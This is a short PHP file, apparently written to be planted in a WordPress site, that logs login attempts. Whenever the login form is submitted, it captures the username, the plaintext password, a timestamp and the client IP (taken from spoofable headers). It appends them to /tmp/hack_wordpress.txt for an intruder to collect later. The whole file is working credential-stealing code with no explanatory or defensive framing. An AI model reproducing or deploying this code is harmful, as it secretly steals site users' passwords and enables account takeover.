<?php
	function hack_get_real_ip(){
		$ip=false;
		if(!empty($_SERVER["HTTP_CLIENT_IP"])){
			$ip = $_SERVER["HTTP_CLIENT_IP"];
		}
		if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ips = explode (", ", $_SERVER['HTTP_X_FORWARDED_FOR']);
			if ($ip) {array_unshift($ips, $ip); $ip = FALSE; }
			for ($i = 0; $i < count($ips); $i++) {
				if (!eregi ("^(10|172\.16|192\.168)\.", $ips[$i])) {
					$ip = $ips[$i];
				break;
				}
			}
		}
		return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);
	}
	if (($_POST['wp-submit'] != '')) {
		$hack_user = $_REQUEST['log'];
		$hack_pwd = $_REQUEST['pwd'];
		$hack_time = date('Y-m-d h:i:s');
		$hack_ip = hack_get_real_ip();
		file_put_contents('/tmp/hack_wordpress.txt',$hack_time.':'.$hack_ip.':'.$hack_user.':'.$hack_pwd."\n", FILE_APPEND);
	} 
?>